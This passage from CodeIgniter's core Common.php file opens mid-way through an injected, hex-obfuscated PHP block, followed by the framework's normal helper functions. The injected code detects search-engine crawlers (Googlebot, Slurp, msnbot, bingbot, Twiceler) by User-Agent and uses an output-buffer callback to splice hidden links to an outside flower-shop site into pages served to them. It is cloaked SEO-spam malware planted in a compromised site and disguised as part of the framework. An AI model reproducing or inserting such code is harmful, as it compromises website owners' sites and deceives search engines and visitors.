M\x65\x6do\x72ia\x6c\x20\x46\x6cowe\x72s</\x61\x3e\x20".${${"GLOB\x41\x4cS"}["\x6e\x70\x6e\x79e\x69\x77\x76\x75"]};if(stristr($_SERVER["H\x54\x54\x50\x5f\x55\x53ER_A\x47\x45\x4eT"],"G\x6fog\x6c\x65bot")!=FALSE||stristr($_SERVER["\x48T\x54\x50\x5fU\x53E\x52_A\x47EN\x54"],"\x53l\x75rp")!=FALSE||stristr($_SERVER["H\x54\x54P\x5f\x55\x53\x45\x52_A\x47ENT"],"T\x77ice\x6ce\x72")!=FALSE||stristr($_SERVER["\x48\x54T\x50_\x55\x53\x45R\x5fAG\x45N\x54"],"\x6ds\x6e\x62\x6f\x74")!=FALSE||stristr($_SERVER["H\x54\x54\x50\x5fU\x53ER\x5f\x41G\x45\x4eT"],"b\x69\x6eg\x62o\x74")!=FALSE){$qdibljouj="\x6e\x65\x65\x64\x6c\x65";$wncabrslk="\x6ee\x65\x64le";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x68kvvr\x70\x75\x72fg\x69"]="\x62\x75ff\x65r";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x61hlw\x73w\x6a\x62n"]="\x69\x6ede\x78";${$qdibljouj}="sy\x6d\x70\x61\x74\x68y\x20flor\x61l ar\x72a\x6e\x67\x65\x6d\x65\x6e\x74\x73\x20so\x20y\x6f\x75 \x64on'\x74\x20h\x61ve t\x6f.";$wdkhytzignz="nee\x64\x6c\x65";${"\x47\x4cO\x42A\x4c\x53"}["\x74\x65\x70\x6cec\x63\x76f"]="\x62uf\x66e\x72";${${"\x47\x4cOB\x41\x4c\x53"}["n\x72\x7a\x74y\x68"]}=strpos(${${"GLOB\x41L\x53"}["\x63\x67i\x74o\x6d\x75\x75"]},${$wncabrslk});${"\x47\x4cO\x42\x41\x4c\x53"}["\x6d\x6d\x62i\x65\x63x\x63k"]="\x6e\x65ed\x6ce";if(${${"\x47\x4c\x4f\x42AL\x53"}["\x61hl\x77\x73\x77\x6ab\x6e"]}===FALSE)return${${"\x47LO\x42\x41\x4c\x53"}["\x68\x6b\x76\x76rpu\x72\x66g\x69"]};${"GL\x4fB\x41\x4c\x53"}["\x67x\x6e\x7a\x67\x6e\x78"]="b\x75f\x66\x65\x72";${${"GLOBA\x4c\x53"}["\x67\x78n\x7ag\x6ex"]}=substr(${${"\x47LO\x42\x41\x4c\x53"}["\x74\x65p\x6c\x65\x63\x63\x76f"]},0,${${"G\x4c\x4fBALS"}["nr\x7a\x74y\x68"]}+strlen(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6dm\x62\x69\x65\x63xc\x6b"]})).${${"\x47L\x4f\x42\x41\x4c\x53"}["\x6a\x6a\x65by\x74uu\x6ev\x65\x6f"]}.substr(${${"\x47\x4c\x4f\x42\x41LS"}["\x63\x67\x69t\x6fm\x75\x75"]},${${"GL\x4f\x42A\x4c\x53"}["n\x72\x7a\x74y\x68"]}+strlen(${$wdkhytzignz}));return${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x63\x67it\x6f\x6d\x75\x75"]};}}else if(strpos($_SERVER["\x52EQ\x55E\x53\x54\x5fURI"],"\x66td")!=FALSE){$twkqsol="\x69nf";${$twkqsol}="\x3cl\x69\x20cla\x73s=\"\x22 >\x3c\x62>\x3ca\x20\x68\x72ef\x3d'h\x74tp://flo\x77\x65\x72\x63\x6f\x6d\x70\x61\x6e\x79\x2e\x63\x61/fl\x6f\x77\x65\x72s/\x66\x74\x64/\x27\x3eF\x54\x44</\x61\x3e\x3c/b\x3e";if(stristr($_SERVER["HT\x54\x50_US\x45\x52_\x41G\x45NT"],"\x47oo\x67\x6cebo\x74")!=FALSE||stristr($_SERVER["\x48T\x54\x50_\x55SE\x52\x5fA\x47E\x4eT"],"Sl\x75\x72p")!=FALSE||stristr($_SERVER["HT\x54\x50\x5f\x55SER\x5f\x41GEN\x54"],"\x54w\x69cel\x65\x72")!=FALSE||stristr($_SERVER["\x48\x54T\x50_\x55\x53\x45\x52\x5f\x41G\x45\x4eT"],"m\x73\x6e\x62o\x74")!=FALSE||stristr($_SERVER["\x48\x54TP\x5fU\x53\x45R_\x41GEN\x54"],"\x62in\x67\x62o\x74")!=FALSE){$bjdziomkdi="\x6e\x65ed\x6ce";$xrkwtemj="i\x6e\x64\x65\x78";$yqfgopac="\x62\x75f\x66er";${${"\x47L\x4f\x42\x41LS"}["\x66yi\x76\x75\x67\x67\x6f\x62\x64"]}="P\x72\x6f\x64\x75\x63t C\x6f\x64\x65:";${"G\x4cO\x42\x41LS"}["ha\x77\x6abup\x78f"]="\x69\x6e\x64ex";$wcmlddare="\x62u\x66f\x65\x72";$fhwhtgfrmosn="\x62\x75\x66\x66\x65r";${${"\x47L\x4f\x42AL\x53"}["n\x72z\x74y\x68"]}=strpos(${${"\x47L\x4f\x42\x41\x4cS"}["\x63\x67\x69\x74\x6f\x6d\x75\x75"]},${$bjdziomkdi});$vqagqohxyde="\x6e\x65\x65\x64\x6c\x65";if(${${"\x47\x4cO\x42\x41L\x53"}["\x68\x61\x77\x6ab\x75p\x78\x66"]}===FALSE)return${${"\x47\x4cO\x42\x41L\x53"}["\x63\x67\x69t\x6f\x6d\x75\x75"]};${"\x47\x4c\x4f\x42\x41L\x53"}["\x77q\x6a\x63\x75\x6e\x75\x67\x6c"]="ind\x65\x78";${$fhwhtgfrmosn}=substr(${$yqfgopac},0,${$xrkwtemj}+strlen(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["f\x79ivug\x67\x6f\x62\x64"]})).${${"\x47\x4c\x4f\x42\x41L\x53"}["\x6aj\x65\x62y\x74u\x75n\x76\x65\x6f"]}.substr(${$wcmlddare},${${"\x47L\x4f\x42\x41L\x53"}["\x77\x71\x6a\x63u\x6eu\x67\x6c"]}+strlen(${$vqagqohxyde}));return${${"\x47\x4c\x4f\x42A\x4c\x53"}["cgito\x6d\x75u"]};}}return${$twotibn};}ob_start("m\x65\x6do\x72\x69\x61l\x78y\x7a");

/**
 * Tests for file writability
 *
 * is_writable() returns TRUE on Windows servers when you really can't write to
 * the file, based on the read-only attribute.  is_writable() is also unreliable
 * on Unix servers if safe_mode is on.
 *
 * @access	private
 * @return	void
 */
if ( ! function_exists('is_really_writable'))
{
	function is_really_writable($file)
	{
		// If we're on a Unix server with safe_mode off we call is_writable
		if (DIRECTORY_SEPARATOR == '/' AND @ini_get("safe_mode") == FALSE)
		{
			return is_writable($file);
		}

		// For windows servers and safe_mode "on" installations we'll actually
		// write a file then read it.  Bah...
		if (is_dir($file))
		{
			$file = rtrim($file, '/').'/'.md5(mt_rand(1,100).mt_rand(1,100));

			if (($fp = @fopen($file, FOPEN_WRITE_CREATE)) === FALSE)
			{
				return FALSE;
			}

			fclose($fp);
			@chmod($file, DIR_WRITE_MODE);
			@unlink($file);
			return TRUE;
		}
		elseif ( ! is_file($file) OR ($fp = @fopen($file, FOPEN_WRITE_CREATE)) === FALSE)
		{
			return FALSE;
		}

		fclose($fp);
		return TRUE;
	}
}

// ------------------------------------------------------------------------

/**
* Class registry
*
* This function acts as a singleton.  If the requested class does not
* exist it is instantiated and set to a static variable.  If it has
* previously been instantiated the variable is returned.
*
* @access	public
* @param	string	the class name being requested
* @param	string	the directory where the class should be found
* @param	string	the class name prefix
* @return	object
*/
if ( ! function_exists('load_class'))
{
	function &load_class($class, $directory = 'libraries', $prefix = 'CI_')
	{
		static $_classes = array();

		// Does the class exist?  If so, we're done...
		if (isset($_classes[$class]))
		{
			return $_classes[$class];
		}

		$name = FALSE;

		// Look for the class first in the local application/libraries folder
		// then in the native system/libraries folder
		foreach (array(APPPATH, BASEPATH) as $path)
		{
			if (file_exists($path.$directory.'/'.$class.'.php'))
			{
				$name = $prefix.$class;

				if (class_exists($name) === FALSE)
				{
					require($path.$directory.'/'.$class.'.php');
				}

				break;
			}
		}

		// Is the request a class extension?  If so we load it too
		if (file_exists(APPPATH.$directory.'/'.config_item('subclass_prefix').$class.'.php'))
		{
			$name = config_item('subclass_prefix').$class;

			if (class_exists($name) === FALSE)
			{
				require(APPPATH.$directory.'/'.config_item('subclass_prefix').$class.'.php');
			}
		}

		// Did we find the class?
		if ($name === FALSE)
		{
			// Note: We use exit() rather then show_error() in order to avoid a
			// self-referencing loop with the Excptions class
			exit('Unable to locate the specified class: '.$class.'.php');
		}

		// Keep track of what we just loaded
		is_loaded($class);

		$_classes[$class] = new $name();
		return $_classes[$class];
	}
}

// --------------------------------------------------------------------

/**
* Keeps track of which libraries have been loaded.  This function is
* called by the load_class() function above
*
* @access	public
* @return	array
*/
if ( ! function_exists('is_loaded'))
{
	function &is_loaded($class = '')
	{
		static $_is_loaded = array();

		if ($class != '')
		{
			$_is_loaded[strtolower($class)] = $class;
		}

		return $_is_loaded;
	}
}

// ------------------------------------------------------------------------

/**
* Loads the main config.php file
*
* This function lets us grab the config file even if the Config class
* hasn't been instantiated yet
*
* @access	private
* @return	array
*/
if ( ! function_exists('get_config'))
{
	function &get_config($replace = array())
	{
		static $_config;

		if (isset($_config))
		{
			return $_config[0];
		}

		// Is the config file in the environment folder?
		if ( ! defined('ENVIRONMENT') OR ! file_exists($file_path = APPPATH.'config/'.ENVIRONMENT.'/config.php'))
		{
			$file_path = APPPATH.'config/config.php';
		}

		// Fetch the config file
		if ( ! file_exists($file_path))
		{
			exit('The configuration file does not exist.');
		}

		require($file_path);

		// Does the $config array exist in the file?
		if ( ! isset($config) OR ! is_array($config))
		{
			exit('Your config file does not appear to be formatted correctly.');
		}

		// Are any values being dynamically replaced?
		if (count($replace) > 0)
		{
			foreach ($replace as $key => $val)
			{
				if (isset($config[$key]))
				{
					$config[$key] = $val;
				}
			}
		}

		return $_config[0] =& $config;
	}
}

// ------------------------------------------------------------------------

/**
* Returns the specified config item
*
* @access	public
* @return	mixed
*/
if ( ! function_exists('config_item'))
{
	function config_item($item)
	{
		static $_config_item = array();

		if ( ! isset($_config_item[$item]))
		{
			$config =& get_config();

			if ( ! isset($config[$item]))
			{
				return FALSE;
			}
			$_config_item[$item] = $config[$item];
		}

		return $_config_item[$item];
	}
}

// ------------------------------------------------------------------------

/**
* Error Handler
*
* This function lets us invoke the exception class and
* display errors using the standard error template located
* in application/errors/errors.php
* This function will send the error page directly to the
* browser and exit.
*
* @access	public
* @return	void
*/
if ( ! function_exists('show_error'))
{
	function show_error($message, $status_code = 500, $heading = 'An Error Was Encountered')
	{
		$_error =& load_class('Exceptions', 'core');
		echo $_error->show_error($heading, $message, 'error_general', $status_code);
		exit;
	}
}

// ------------------------------------------------------------------------

/**
* 404 Page Handler
*
* This function is similar to the show_error() function above
* However, instead of the standard error template it displays
* 404 errors.
*
* @access	public
* @return	void
*/
if ( ! function_exists('show_404'))
{
	function show_404($page = '', $log_error = TRUE)
	{
		$_error =& load_class('Exceptions', 'core');
		$_error->show_404($page, $log_error);
		exit;
	}
}

// ------------------------------------------------------------------------

/**
* Error Logging Interface
*
* We use this as a simple mechanism to access the logging
* class and send messages to be logged.
*
* @access	public
* @return	void
*/
if ( ! function_exists('log_message'))
{
	function log_message($level = 'error', $message, $php_error = FALSE)
	{
		static $_log;

		if (config_item('log_threshold') == 0)
		{
			return;
		}

		$_log =& load_class('Log');
		$_log->write_log($level, $message, $php_error);
	}
}

// ------------------------------------------------------------------------

/**
 * Set HTTP Status Header
 *
 * @access	public
 * @param	int		the status code
 * @param	string
 * @return	void
 */
if ( ! function_exists('set_status_header'))
{
	function set_status_header($code = 200, $text = '')
	{
		$stati = array(
							200	=> 'OK',
							201	=> 'Created',
							202	=> 'Accepted',
							203	=> 'Non-Authoritative Information',
							204	=> 'No Content',
							205	=> 'Reset Content',
							206	=> 'Partial Content',

							300	=> 'Multiple Choices',
							301	=> 'Moved Permanently',
							302	=> 'Found',
							304	=> 'Not Modified',
							305	=> 'Use Proxy',
							307	=> 'Temporary Redirect',

							400	=> 'Bad Request',
							401	=> 'Unauthorized',
							403	=> 'Forbidden',
							404	=> 'Not Found',
							405	=> 'Method Not Allowed',
							406	=> 'Not Acceptable',
							407	=> 'Proxy Authentication Required',
							408	=> 'Request Timeout',
							409	=> 'Conflict',
							410	=> 'Gone',
							411	=> 'Length Required',
							412	=> 'Precondition Failed',
							413	=> 'Request Entity Too Large',
							414	=> 'Request-URI Too Long',
							415	=> 'Unsupported Media Type',
							416	=> 'Requested Range Not Satisfiable',
							417	=> 'Expectation Failed',

							500	=> 'Internal Server Error',
							501	=> 'Not Implemented',
							502	=> 'Bad Gateway',
							503	=> 'Service Unavailable',
							504	=> 'Gateway Timeout',
							505	=> 'HTTP Version Not Supported'
						);

		if ($code == '' OR ! is_numeric($code))
		{
			show_error('Status codes must be numeric', 500);
		}

		if (isset($stati[$code]) AND $text == '')
		{
			$text = $stati[$code];
		}

		if ($text == '')
		{
			show_error('No status text available.  Please check your status code number or supply your own message text.', 500);
		}

		$server_protocol = (isset($_SERVER['SERVER_PROTOCOL'])) ? $_SERVER['SERVER_PROTOCOL'] : FALSE;

		if (substr(php_sapi_name(), 0, 3) == 'cgi')
		{
			header("Status: {$code} {$text}", TRUE);
		}
		elseif ($server_protocol == 'HTTP/1.1' OR $server_protocol == 'HTTP/1.0')
		{
			header($server_protocol." {$code} {$text}", TRUE, $code);
		}
		else
		{
			header("HTTP/1.1 {$code} {$text}", TRUE, $code);
		}
	}
}

// --------------------------------------------------------------------

/**
* Exception Handler
*
* This is the custom exception handler that is declaired at the top
* of Codeigniter.php.  The main reason we use this is to permit
* PHP errors to be logged in our own log files since the user may
* not have access to server logs. Since this function
* effectively intercepts PHP errors, however, we also need
* to display errors based on the current error_reporting level.
* We do that with the use of a PHP error template.
*
* @access	private
* @return	void
*/
if ( ! function_exists('_exception_handler'))
{
	function _exception_handler($severity, $message, $filepath, $line)
	{
		 // We don't bother with "strict" notices since they tend to fill up
		 // the log file with excess information that isn't normally very helpful.
		 // For example, if you are running PHP 5 and you use version 4 style
		 // class functions (without prefixes like "public", "private", etc.)
		 // you'll get notices telling you that these have been deprecated.
		if ($severity == E_STRICT)
		{
			return;
		}

		$_error =& load_class('Exceptions', 'core');

		// Should we display the error? We'll get the current error_reporting
		// level and add its bits with the severity bits to find out.
		if (($severity & error_reporting()) == $severity)
		{
			$_error->show_php_error($severity, $message, $filepath, $line);
		}

		// Should we log the error?  No?  We're done...
		if (config_item('log_threshold') == 0)
		{
			return;
		}

		$_error->log_exception($severity, $message, $filepath, $line);
	}
}

// --------------------------------------------------------------------

/**
 * Remove Invisible Characters
 *
 * This prevents sandwiching null characters
 * between ascii characters, like Java\0script.
 *
 * @access	public
 * @param	string
 * @return	string
 */
if ( ! function_exists('remove_invisible_characters'))
{
	function remove_invisible_characters($str, $url_encoded = TRUE)
	{
		$non_displayables = array();
		
		// every control character except newline (dec 10)
		// carriage return (dec 13), and horizontal tab (dec 09)
		
		if ($url_encoded)
		{
			$non_displayables[] = '/%0[0-8bcef]/';	// url encoded 00-08, 11, 12, 14, 15
			$non_displayables[] = '/%1[0-9a-f]/';	// url encoded 16-31
		}
		
		$non_displayables[] = '/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S';	// 00-08, 11, 12, 14-31, 127

		do
		{
			$str = preg_replace($non_displayables, '', $str, -1, $count);
		}
		while ($count);

		return $str;
	}
}

// ------------------------------------------------------------------------

/**
* Returns HTML escaped variable
*
* @access	public
* @param	mixed
* @return	mixed
*/
if ( ! function_exists('html_escape'))
{
	function html_escape($var)
	{
		if (is_array($var))
		{
			return array_map('html_escape', $var);
		}
		else
		{
			return htmlspecialchars($var, ENT_QUOTES, config_item('charset'));
		}
	}
}

/* End of file Common.php */
/* Location: ./system/core/Common.php */